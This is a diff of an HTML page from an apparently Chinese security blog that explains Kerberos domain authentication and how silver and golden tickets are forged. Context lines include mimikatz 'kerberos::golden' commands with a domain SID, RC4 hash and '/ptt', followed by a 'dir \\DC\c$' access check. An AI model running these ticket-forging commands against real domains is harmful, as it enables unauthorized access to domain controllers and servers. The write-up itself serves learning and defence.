@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="@[TOC] 0x00 前提算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈 0x01 Kerberos域认证Kerberos 是一种网络认证协议，其设计目标是通过密钥">
+    <meta name="description" content="文章目录 0x00 前提  0x01 Kerberos域认证  域认证大致流程：  第一部分：生成TGT 和 session key  第二步：获取要访问的 server ticket  第三部 向客户端向服务器请求认证  0x01 白银票据(Silver Tickets)  伪造白银票据(Silver Tickets)   0x02 黄金票据（Golden Ticket）  伪造黄金票据">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网安全:Kerberos域认证流程---黄金票据和白银票据">
 <meta property="og:url" content="https://godzeo.github.io/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="@[TOC] 0x00 前提算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈 0x01 Kerberos域认证Kerberos 是一种网络认证协议，其设计目标是通过密钥">
+<meta property="og:description" content="文章目录 0x00 前提  0x01 Kerberos域认证  域认证大致流程：  第一部分：生成TGT 和 session key  第二步：获取要访问的 server ticket  第三部 向客户端向服务器请求认证  0x01 白银票据(Silver Tickets)  伪造白银票据(Silver Tickets)   0x02 黄金票据（Golden Ticket）  伪造黄金票据">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png">
@@ -19,9 +19,10 @@
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png">
 <meta property="article:published_time" content="2020-05-12T06:11:44.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.492Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:03.895Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -60,6 +61,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -122,7 +125,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前提"><span class="toc-number">1.</span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos域认证"><span class="toc-number">2.</span> <span class="toc-text">0x01 Kerberos域认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域认证大致流程："><span class="toc-number">3.</span> <span class="toc-text">域认证大致流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分：生成TGT-和-session-key"><span class="toc-number">4.</span> <span class="toc-text">第一部分：生成TGT 和  session key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二步：获取要访问的-server-ticket"><span class="toc-number">5.</span> <span class="toc-text">第二步：获取要访问的 server ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部-向客户端向服务器请求认证"><span class="toc-number">6.</span> <span class="toc-text">第三部 向客户端向服务器请求认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-白银票据-Silver-Tickets"><span class="toc-number">7.</span> <span class="toc-text">0x01 白银票据(Silver Tickets)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造白银票据-Silver-Tickets"><span class="toc-number">7.1.</span> <span class="toc-text">伪造白银票据(Silver Tickets)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黄金票据（Golden-Ticket）"><span class="toc-number">8.</span> <span class="toc-text">0x02 黄金票据（Golden Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">8.1.</span> <span class="toc-text">伪造黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-黄金票据和白银票据比较"><span class="toc-number">9.</span> <span class="toc-text">0x03 黄金票据和白银票据比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">10.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前提"><span class="toc-number"></span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos域认证"><span class="toc-number"></span> <span class="toc-text">0x01 Kerberos域认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域认证大致流程："><span class="toc-number"></span> <span class="toc-text">域认证大致流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分：生成TGT-和-session-key"><span class="toc-number"></span> <span class="toc-text">第一部分：生成TGT 和 session key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二步：获取要访问的-server-ticket"><span class="toc-number"></span> <span class="toc-text">第二步：获取要访问的 server ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部-向客户端向服务器请求认证"><span class="toc-number"></span> <span class="toc-text">第三部 向客户端向服务器请求认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-白银票据-Silver-Tickets"><span class="toc-number"></span> <span class="toc-text">0x01 白银票据(Silver Tickets)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造白银票据-Silver-Tickets"><span class="toc-number">1.</span> <span class="toc-text">伪造白银票据(Silver Tickets)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黄金票据（Golden-Ticket）"><span class="toc-number"></span> <span class="toc-text">0x02 黄金票据（Golden Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">1.</span> <span class="toc-text">伪造黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-黄金票据和白银票据比较"><span class="toc-number"></span> <span class="toc-text">0x03 黄金票据和白银票据比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number"></span> <span class="toc-text">0x04 参考</span></a>
     </div>
   </span>
 </div>
@@ -168,9 +171,38 @@
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
 
-<p>@[TOC]</p>
+
+
+<h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul>
+<li><p><a href="#0x00__3">0x00 前提</a></p>
+</li>
+<li><p><a href="#0x01_Kerberos_7">0x01 Kerberos域认证</a></p>
+</li>
+<li><p><a href="#_41">域认证大致流程：</a></p>
+</li>
+<li><p><a href="#TGT___session_key_53">第一部分：生成TGT 和 session key</a></p>
+</li>
+<li><p><a href="#_server_ticket_79">第二步：获取要访问的 server ticket</a></p>
+</li>
+<li><p><a href="#__109">第三部 向客户端向服务器请求认证</a></p>
+</li>
+<li><p><a href="#0x01_Silver_Tickets_133">0x01 白银票据(Silver Tickets)</a></p>
+<ul>
+<li><a href="#Silver_Tickets_161">伪造白银票据(Silver Tickets)</a></li>
+</ul>
+</li>
+<li><p><a href="#0x02_Golden_Ticket_220">0x02 黄金票据（Golden Ticket）</a></p>
+<ul>
+<li><a href="#_236">伪造黄金票据</a></li>
+</ul>
+</li>
+<li><p><a href="#0x03__288">0x03 黄金票据和白银票据比较</a></p>
+</li>
+<li><p><a href="#0x04__300">0x04 参考</a></p>
+</li>
+</ul>
 <h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p>
-<h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p>
+<h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p>
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p>
 <p>Kerberos的标志是三只狗头，分别代表以下角色：</p>
 <ul>
@@ -185,7 +217,7 @@
 <li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p>
 <p>（物理方面 KDC和AD 都是一个机子）</p>
 </li>
-<li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p>
+<li><p>TGT: Ticket Granting Ticket = 入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p>
 </li>
 <li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p>
 </li>
@@ -202,7 +234,7 @@
 <li><p>Client使用ST（TGS Ticket）访问Server</p>
 </li>
 </ol>
-<h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p>
+<h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和 session key"></a>第一部分：生成TGT 和 session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p>
 <p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p>
 <p>第一部分：获取了 TGT</p>
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p>
@@ -229,7 +261,6 @@
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure>
 
-
 <p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p>
 <p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p>
 <h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p>
@@ -245,16 +276,10 @@
 <p>伪造票据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure>
 
-
-
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure>
-
-
 
 <p>验证权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure>
-
-
 
 <p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p>
 <table>
@@ -321,10 +346,6 @@
 <p>权限验证</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure>
 
-
-
-
-
 <h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table>
 <thead>
 <tr>
@@ -349,7 +370,7 @@
 <td>直接和服务器认，最后一步认证</td>
 </tr>
 </tbody></table>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a></p>
 
   </div>
 </article>
@@ -379,7 +400,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前提"><span class="toc-number">1.</span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos域认证"><span class="toc-number">2.</span> <span class="toc-text">0x01 Kerberos域认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域认证大致流程："><span class="toc-number">3.</span> <span class="toc-text">域认证大致流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分：生成TGT-和-session-key"><span class="toc-number">4.</span> <span class="toc-text">第一部分：生成TGT 和  session key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二步：获取要访问的-server-ticket"><span class="toc-number">5.</span> <span class="toc-text">第二步：获取要访问的 server ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部-向客户端向服务器请求认证"><span class="toc-number">6.</span> <span class="toc-text">第三部 向客户端向服务器请求认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-白银票据-Silver-Tickets"><span class="toc-number">7.</span> <span class="toc-text">0x01 白银票据(Silver Tickets)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造白银票据-Silver-Tickets"><span class="toc-number">7.1.</span> <span class="toc-text">伪造白银票据(Silver Tickets)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黄金票据（Golden-Ticket）"><span class="toc-number">8.</span> <span class="toc-text">0x02 黄金票据（Golden Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">8.1.</span> <span class="toc-text">伪造黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-黄金票据和白银票据比较"><span class="toc-number">9.</span> <span class="toc-text">0x03 黄金票据和白银票据比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">10.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前提"><span class="toc-number"></span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos域认证"><span class="toc-number"></span> <span class="toc-text">0x01 Kerberos域认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域认证大致流程："><span class="toc-number"></span> <span class="toc-text">域认证大致流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分：生成TGT-和-session-key"><span class="toc-number"></span> <span class="toc-text">第一部分：生成TGT 和 session key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二步：获取要访问的-server-ticket"><span class="toc-number"></span> <span class="toc-text">第二步：获取要访问的 server ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部-向客户端向服务器请求认证"><span class="toc-number"></span> <span class="toc-text">第三部 向客户端向服务器请求认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-白银票据-Silver-Tickets"><span class="toc-number"></span> <span class="toc-text">0x01 白银票据(Silver Tickets)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造白银票据-Silver-Tickets"><span class="toc-number">1.</span> <span class="toc-text">伪造白银票据(Silver Tickets)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黄金票据（Golden-Ticket）"><span class="toc-number"></span> <span class="toc-text">0x02 黄金票据（Golden Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">1.</span> <span class="toc-text">伪造黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-黄金票据和白银票据比较"><span class="toc-number"></span> <span class="toc-text">0x03 黄金票据和白银票据比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number"></span> <span class="toc-text">0x04 参考</span></a>
     </div>
 
     <div id="share-footer" style="display: none">
